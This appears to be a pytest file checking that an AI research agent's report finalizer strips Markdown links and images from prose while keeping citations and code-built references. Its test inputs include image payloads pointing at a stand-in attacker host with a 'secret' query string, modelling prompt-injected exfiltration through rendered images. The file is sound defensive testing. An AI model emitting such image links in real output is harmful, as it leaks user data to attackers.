"""The report's prose must not carry links or images the model was talked into writing.

The reference list is built by code, so it is the only place with links. A Markdown image in the prose would make the
reader's browser contact whatever address it names; a link could lead to a page of an attacker's choosing
(docs/security.md, "What is not defended", point 3).
"""
import pytest

from backend.agents.synthesis_agent import SynthesisAgent

SOURCES = [{"number": 1, "title": "A real paper", "url": "https://example.org/p", "tool_id": "web_search"}]


def finalize(report):
    return SynthesisAgent()._finalize_citations(report, SOURCES)


def prose_of(report):
    return report.split("## References")[0]


# --------------------------------------------------------------------------------------
# What is removed
# --------------------------------------------------------------------------------------
def test_an_image_is_dropped_entirely():
    report, _, _ = finalize("Result ![plot](https://evil.example/p.png?q=secret) shown [1].")
    assert "evil.example" not in report
    assert prose_of(report).strip() == "Result shown [1]."


def test_a_link_keeps_its_text_and_loses_its_address():
    report, _, _ = finalize("See [the paper](https://evil.example/x) for detail [1].")
    assert "evil.example" not in report
    assert prose_of(report).strip() == "See the paper for detail [1]."


def test_several_links_and_images_in_one_report():
    text = "A [one](https://e.example/1) B ![i](https://e.example/i.png) C [two](https://e.example/2) [1]."
    report, _, _ = finalize(text)
    assert "e.example" not in report
    assert prose_of(report).strip() == "A one B C two [1]."


# --------------------------------------------------------------------------------------
# What must survive
# --------------------------------------------------------------------------------------
def test_a_numbered_link_keeps_its_citation():
    report, cited, removed = finalize("Claim [1](https://evil.example/y).")
    assert "evil.example" not in report
    assert prose_of(report).strip() == "Claim [1]."
    assert [s["number"] for s in cited] == [1] and removed == 0


def test_the_reference_list_built_by_code_keeps_its_real_link():
    report, _, _ = finalize("Claim [1] and ![x](https://evil.example/i.png).")
    references = report.split("## References")[1]
    assert "(https://example.org/p)" in references
    assert "evil.example" not in report


@pytest.mark.parametrize(
    "prose",
    [
        r"The $\text{[PbI}_3\text{]}^-$ octahedra are stable [1].",
        "The range [a, b] and the value (0.5) are unrelated [1].",
        "Two citations [1] (Materials Project) in a row.",
        "Plain text without any brackets [1].",
    ],
)
def test_brackets_that_are_not_links_are_untouched(prose):
    report, _, _ = finalize(prose)
    assert prose_of(report).strip() == prose
